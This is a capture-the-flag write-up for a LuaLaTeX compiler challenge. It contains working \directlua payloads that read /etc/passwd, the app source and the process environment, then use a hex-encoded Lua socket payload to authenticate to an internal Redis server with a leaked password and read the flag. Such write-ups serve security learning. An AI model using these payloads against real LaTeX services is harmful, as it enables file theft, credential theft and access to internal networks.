# Lay Low-ah

## Writeup

1. First of all, we try to load files using input and include, but it doesn't seem to work.

2. From the description we understand that it's one of the latex compilers for linux, and from the name of the challenge, we can guess that it's `LuaLaTeX`.

3. Lualatex offers a command to execute lua code, which is `\directlua`, and we're going to use it in order to exfiltrate all the infos that we need.

4. We'll try to read files with it:

    ```latex
    \documentclass{book}
    \begin{document}
    \directlua{

        local file = io.open("/etc/passwd", "r")
        local text = file:read("*all")
        file:close()
        tex.print(-2, text)

    }
    adscrf
    \end{document}
    ```

    We can see that it works!

5. Since it's a flask app, we can guess `app.py` file, we'll try to read it:

    ```python
    #!/usr/bin/python3

    from flask import Flask, request, render_template, redirect, url_for, make_response
    from utils import PDF, remove_pdfs, make_cache_key
    from flask_caching import Cache, CachedResponse

    app = Flask(__name__)
    app.config.from_object('config.BaseConfig')  
    cache = Cache(app)


    @app.route("/", methods=["GET", "HEAD"])
    def root():
        return redirect(url_for("compile"))


    @app.route("/compile", methods=["GET", "POST", "HEAD"])
    @cache.cached(timeout=30, key_prefix=make_cache_key)
    def compile():
        pdf = None

        if request.method == "GET":
            return render_template("./compile.html", pdf=pdf)
        elif request.method == "POST":
            latex_text = request.form.get("latex_text")

            try:
                pdf = PDF(latex_text).generate_pdf()
                if pdf is not None:
                    result = "Compiled successfully!"
                    return CachedResponse(
                        response=make_response(
                            render_template(
                                "./compile.html", result=result, pdf=pdf
                            )
                        )
                        ,timeout=50,
                    )
                else:
                    raise Exception("")
            except Exception as e:
                print(e)
                result = "something is going wrong"
                pdf = None
                return render_template("./compile.html", result=result, pdf=pdf)
        else:
            return render_template("./compile.html")
    ```

6. We notice that it's using flask_caching, hence the optimization in the rendering as it's mentioned in the description. After some documentation, we understand that the config of caching it's imported from `config.py` here:

    ```python
    app.config.from_object('config.BaseConfig')
    ```

7. We dump the `config.py`:

    ```python
    import os

    URL = "http://localhost:8000"


    class BaseConfig(object):
        CACHE_TYPE = os.environ['CACHE_TYPE']
        CACHE_REDIS_HOST = os.environ['CACHE_REDIS_HOST']
        CACHE_REDIS_PORT = os.environ['CACHE_REDIS_PORT']
        CACHE_REDIS_DB = os.environ['CACHE_REDIS_DB']
        CACHE_REDIS_URL = os.environ['CACHE_REDIS_URL']
        CACHE_DEFAULT_TIMEOUT = os.environ['CACHE_DEFAULT_TIMEOUT']
        # os.system('lua /ctf/insert_flag.lua')
        # os.system('rm /ctf/insert_flag.lua')
    ```

8. We see that it's using Redis for caching, and from the 2 last lines, we can deduct that probably the flag is pushed to redis and it's not anymore on the server.

9. We can retrieve the environment variables from `/proc/self/environ` file:

    ```env
    HOSTNAME=5010384e97f6
    CACHE_REDIS_URL=redis://:JtmvalTXG91siKBIrCxmsDfXNfkl8Gck@cache:6379/0
    PWD=/ctf
    CACHE_TYPE=redis
    HOME=/root
    LANG=CUTF-8T
    EXLIVE_INSTALL_NO_CONTEXT_CACHE=1
    CACHE_REDIS_HOST=cache
    TERM=xterm
    CACHE_REDIS_DB=0
    SHLVL=1
    CACHE_REDIS_PORT=6379
    FLASK_DEBUG=production
    LC_ALL=C.UTF-8
    CACHE_DEFAULT_TIMEOUT=500
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NOPERLDOC=1_=/bin/cat
    ```

10. Now, we have redis credentials, we have to be able to communicate with redis server using Lua.

11. Trying to use redis packages won't help because they are not installed. But if we check `socket` one, we find that it works.  

    Redis doesn't support http requests, even socket module doesn't support gopher protocol, so we are obliged to communicate with redis by using tcp socket and send the exact syntax that redis uses.  
    After documentation, the syntax is:

    ```lua
    "*2\r\n$4\r\nGET\r\n$1\r\n*\r\n"
    ```

    This line will get all entries.  
    We will start to craft our payload.

12. We notice that Latex has a problem with all these special chars, so we will use Hexadecimal instead, decode it then send it.

13. Without forgeting the authentication part, and after printing all the keys, we find that flag is `FLAG`.

    So the final payload is:  

    ```lua
    "*2\r\n$4\r\nAUTH\r\n$32\r\nJtmvalTXG91siKBIrCxmsDfXNfkl8Gck\r\n*2\r\n$3\r\nGET\r\n$4\r\nFLAG\r\n"
    ```

    And here's the latex document to send:

    ```latex
    \documentclass{book}
    \begin{document}
    \directlua{
        function fromHex(str)
            return (str:gsub('..', function (cc)
                return string.char(tonumber(cc, 16))
            end))
        end
        str = "2a320d0a24340d0a415554480d0a2433320d0a4a746d76616c545847393173694b42497243786d734466584e666b6c3847636b0d0a2a320d0a24330d0a4745540d0a24340d0a464c41470d0a"
        local res = fromHex(str)
        local host, port = "cache", 6379
        local socket = require("socket")
        local tcp = assert(socket.tcp())
        tcp:connect(host, port);
        tcp:send(res);
        tcp:settimeout(2)
        for i=1,3 do
            local s, status, partial = tcp:receive()
            tex.print(-2,s,partial)
        end
        tcp:close()
    }
    \end{document}
    ```

14. The flag is `CyberErudites{r3d1s_0bv105l7y_m34n5_55RF}`.
